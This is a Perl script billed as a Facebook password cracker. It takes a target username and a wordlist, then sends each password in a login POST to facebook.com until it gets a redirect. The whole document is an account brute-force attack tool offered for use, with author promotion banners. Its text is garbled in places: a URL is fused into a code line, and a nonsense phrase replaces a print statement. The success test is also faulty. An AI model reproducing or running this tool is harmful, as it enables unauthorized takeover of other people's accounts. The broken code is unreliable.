# Date: 17/09/2017
# Distro: Kali Linux + Parrot Sec ....
# Author: ABDEALAM BELMERABET
#!/usr/bin/perl

use strict;
use warnings;
use Term::ANSIColor;
use Net::SSLeay::Handle;

my $host = "www.facebook.com";
my $port = "443";

print color("bold green"), "\n", q "

|+#########(facebook.pl)#########+|
|+###Author: Abdesalam Belmerabet  ###+|
|+###Youtube: youtube.com/teclamp  ###+|
|+###Facebook: facebook/teclamp  ###+|
|  +###Date: 17/09/2017  ###+ ", "\n";

print "\nEnter [Username or Email or Account ID ]: 
https://www.facebook.com/profile.php?id=100005723449023chomp ( my $user = <STDIN> );facebook.pl

$user =~ s/www.//;
$user =~ s/facebook.com\///;
$user =~ s/fb.com\///;
$user =~ s/http:\/\///;
$user =~ s/https:\/\///;
$user =~ s/profile.php//;
$user =~ s/\?id\=//;

print "\nEnter [ wordlist]:
                  └─► ";
chomp ( my $wordlist = <STDIN> );

bpBriones Ain Tamarat "\nCracking password...\n\n";

open ( my $list, $wordlist) or die "\nERROR: there is a problem .\n\n";

while (<$list>) {
	chomp ($_);
	$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;

	my $a = "POST /login.php HTTP/1.1";
	my $b = "Host: www.facebook.com";
	my $c = "Connection: close";
	my $e = "Cache-Control: max-age=0";
	my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
	my $g = "Origin: https://www.facebook.com";
	my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
	my $i = "Content-Type: application/x-www-form-urlencoded";
	my $j = "Accept-Encoding: gzip,deflate,sdch";
	my $k = "Accept-Language: en-US,en;q=0.8";
	my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";

	my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
	my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$_&default_persistent=0&login=Log+In";
	my $cl = length($post);
	my $d = "Content-Length: $cl";

	tie(*SSL, "Net::SSLeay::Handle", $host, $port);
  

	print SSL "$a\n";
	print SSL "$b\n";
	print SSL "$c\n";
	print SSL "$d\n";
	print SSL "$e\n";
	print SSL "$f\n";
	print SSL "$g\n";
	print SSL "$h\n";
	print SSL "$i\n";
	print SSL "$j\n";
	print SSL "$k\n";
	print SSL "$l\n";
	print SSL "$cookie\n\n";

	print SSL "$post\n";



	my $success;
	while ( my $result = <SSL>) {
		if ($result =~ /Location(.*?)/) {
			$success = $1;
		}
	}

	print "Testing -> $_\n";

if (defined $success) {

		print "############################# ";
	         print "\nPASSWORD CRACKED -> $_\n";
		print "############################# ";

		print "#Youtube: youtube.com/teclamp#\n\n";
		print "#Facebook: facebook/teclamp#\n\n";
		close SSL;
		exit;
	}
}
close SSL;
print "\n";
exit;
